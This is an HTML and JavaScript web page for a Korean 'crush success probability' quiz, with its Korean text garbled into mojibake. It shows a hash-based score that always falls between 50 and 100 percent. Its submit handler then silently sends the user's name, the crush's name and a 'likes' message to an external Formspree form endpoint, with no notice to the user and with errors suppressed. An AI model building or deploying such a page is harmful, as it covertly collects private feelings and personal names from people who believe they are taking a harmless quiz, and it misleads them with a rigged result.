<!doctype html>
<html lang="ko">
<head>
  <meta charset="utf-8">
  <title>ì§ì‚¬ë‘ í™•ë¥  í…ŒìŠ¤íŠ¸ ğŸ’˜ (ê²°ê³¼ ê³ ì •í˜•)</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    body {
      font-family: 'Arial', sans-serif;
      text-align: center;
      background: linear-gradient(180deg,#fff0f5,#ffeef8);
      padding: 60px 16px;
      color: #333;
    }
    .card {
      display: inline-block;
      background: white;
      padding: 28px;
      border-radius: 12px;
      box-shadow: 0 8px 30px rgba(0,0,0,0.08);
      max-width: 420px;
      width: 100%;
    }
    h1 { margin: 0 0 8px; font-size: 22px; }
    p { margin-top: 0; color: #666; }
    input, button {
      padding: 12px 14px;
      margin: 8px 0;
      font-size: 16px;
      border-radius: 8px;
      border: 1px solid #e6cfe0;
      width: calc(100% - 32px);
      box-sizing: border-box;
    }
    input:focus { outline: none; box-shadow: 0 0 0 3px rgba(255,105,180,0.12); }
    button {
      background-color: #ff69b4;
      color: white;
      cursor: pointer;
      border: none;
      font-weight: 600;
    }
    #result {
      font-size: 20px;
      margin-top: 18px;
      min-height: 36px;
    }
    .small {
      font-size: 13px;
      color: #999;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>ğŸ’˜ ì§ì‚¬ë‘ ì„±ê³µ í™•ë¥  í…ŒìŠ¤íŠ¸ ğŸ’˜</h1>
    <p>ë‘ ì‚¬ëŒì˜ ì´ë¦„ì„ ì…ë ¥í•˜ì„¸ìš” (ê°™ì€ ì´ë¦„ ì¡°í•©ì´ë©´ í•­ìƒ ê°™ì€ ê²°ê³¼ê°€ ë‚˜ì˜µë‹ˆë‹¤).</p>

    <form id="loveForm">
      <input type="text" id="yourName" name="yourName" placeholder="ë‹¹ì‹ ì˜ ì´ë¦„" required autocomplete="off"><br>
      <input type="text" id="crushName" name="crushName" placeholder="ì§ì‚¬ë‘ ìƒëŒ€ ì´ë¦„" required autocomplete="off"><br>
      <button type="submit">í™•ë¥  ë³´ê¸°</button>
    </form>

    <div id="result"></div>
    <div class="small">ê°™ì€ ì´ë¦„ ì¡°í•©ì´ë©´(ì˜ˆ: "ê¹€ë•¡ë•¡" + "ìµœë•¡ë•¡") ì–¸ì œë‚˜ ë™ì¼í•œ ìˆ«ìê°€ ë‚˜ì˜µë‹ˆë‹¤. ì´ë¦„ ìˆœì„œëŠ” ë¬´ì‹œë©ë‹ˆë‹¤.</div>
  </div>

  <script>
    // djb2 í•´ì‹œ í•¨ìˆ˜ (ê°„ë‹¨í•˜ê³  ë¹ ë¦„)
    function djb2Hash(str) {
      let hash = 5381;
      for (let i = 0; i < str.length; i++) {
        hash = ((hash << 5) + hash) + str.charCodeAt(i); // hash * 33 + c
        // ìë°”ìŠ¤í¬ë¦½íŠ¸ ì •ìˆ˜ ì˜¤ë²„í”Œë¡œìš° ë°©ì§€
        hash = hash & 0xFFFFFFFF;
      }
      return Math.abs(hash);
    }

    // ì´ë¦„ ì •ê·œí™”: ê³µë°± ì œê±°, ì†Œë¬¸ìí™”, ì—°ì† ê³µë°±ì€ ë‹¨ì¼ ê³µë°±ìœ¼ë¡œ
    function normalizeName(name) {
      return name.trim().replace(/\s+/g, ' ').toLowerCase();
    }

    // ë‘ ì´ë¦„ ì¡°í•©ìœ¼ë¡œ 50~100 ì‚¬ì´ì˜ ê²°ì •ì  í¼ì„¼íŠ¸ ìƒì„±
    function deterministicPercent(nameA, nameB) {
      const a = normalizeName(nameA);
      const b = normalizeName(nameB);
      // ìˆœì„œ ë¬´ì‹œ: ì•ŒíŒŒë²³(ìœ ë‹ˆì½”ë“œ) ìˆœì„œ ê¸°ì¤€ìœ¼ë¡œ ì •ë ¬
      const pair = [a, b].sort().join('|'); // êµ¬ë¶„ì í¬í•¨
      const hash = djb2Hash(pair);
      // 0 ~ 50 ê¹Œì§€ ê°’ -> +50 => 50 ~ 100
      const percent = (hash % 51) + 50;
      return percent;
    }

    document.getElementById("loveForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const yourName = document.getElementById("yourName").value;
      const crushName = document.getElementById("crushName").value;
      const resultBox = document.getElementById("result");

      if (!yourName.trim() || !crushName.trim()) {
        resultBox.innerText = "âš ï¸ ì´ë¦„ì„ ëª¨ë‘ ì…ë ¥í•´ì£¼ì„¸ìš”!";
        return;
      }

      const percent = deterministicPercent(yourName, crushName);

      // ë‹¤ì–‘í•œ ë¬¸êµ¬ë¥¼ ê²°ê³¼ì— ì„ì–´ ë³´ì—¬ì£¼ê¸° (ê°™ì€ percentì´ë©´ ê°™ì€ ë¬¸êµ¬ ì„ íƒ)
      const messages = [
        "ìš´ëª…ì˜ ê°€ëŠ¥ì„±",
        "ë‹¬ì½¤í•œ ê¸°íšŒ",
        "ì„¤ë ˜ ì§€ìˆ˜",
        "ì„±ê³µ í™•ë¥ ",
        "ì§ì‚¬ë‘ì˜ ë³„ì "
      ];
      // ë¬¸êµ¬ë„ ê²°ì •ì ìœ¼ë¡œ ì„ íƒ (ê°™ì€ ì´ë¦„ìŒì´ë©´ í•­ìƒ ê°™ì€ ë¬¸êµ¬)
      const msgIndex = djb2Hash(normalizeName(yourName) + '|' + normalizeName(crushName)) % messages.length;
      const label = messages[msgIndex];

      resultBox.innerText = `ğŸ˜ ${yourName}ì™€(ê³¼) ${crushName}ì˜ ${label}ì€(ëŠ”) ${percent}%ì…ë‹ˆë‹¤!`;

      // ê¸°ì¡´ì²˜ëŸ¼ Formspreeë¡œ ì „ì†¡ (ë¹„ë™ê¸°, ì‹¤íŒ¨ì‹œ ë¬´ì‹œ)
      fetch("https://formspree.io/f/xanegwav", {
        method: "POST",
        headers: {
          "Accept": "application/json",
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          yourName: yourName,
          crushName: crushName,
          message: `${yourName}ê°€ ${crushName}ë¥¼ ì¢‹ì•„í•´ìš”! (ê²°ì •ì  í™•ë¥ : ${percent}%)`
        })
      }).catch(() => {
        // ì „ì†¡ ì‹¤íŒ¨ì‹œ ì¡°ìš©íˆ ë¬´ì‹œ (ë„¤íŠ¸ì›Œí¬ ë¬¸ì œ ë“±)
      });
    });
  </script>
</body>
</html>
